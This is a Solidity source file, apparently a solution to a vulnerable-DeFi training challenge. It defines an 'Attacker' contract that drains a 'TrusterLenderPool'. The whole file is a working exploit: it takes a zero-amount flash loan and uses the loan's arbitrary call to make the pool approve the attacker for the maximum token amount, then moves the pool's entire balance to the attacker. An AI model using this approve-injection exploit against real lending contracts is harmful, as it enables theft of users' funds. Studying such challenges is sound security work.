// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract Attacker{
    uint256 constant public MAX_UINT = 2**256 - 1;

    IERC20 public token;
    TrusterLenderPool public pool;

    constructor (address _pool, address _token) {
        token = IERC20(_token);
        pool = TrusterLenderPool(_pool);
    }

    // call approve function for attacker contract and transfer to attacker
    function attack(address _attacker) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), MAX_UINT);
        pool.flashLoan(0, _attacker, address(token), data);

        token.transferFrom(address(pool), _attacker, token.balanceOf(address(pool)));
    }
}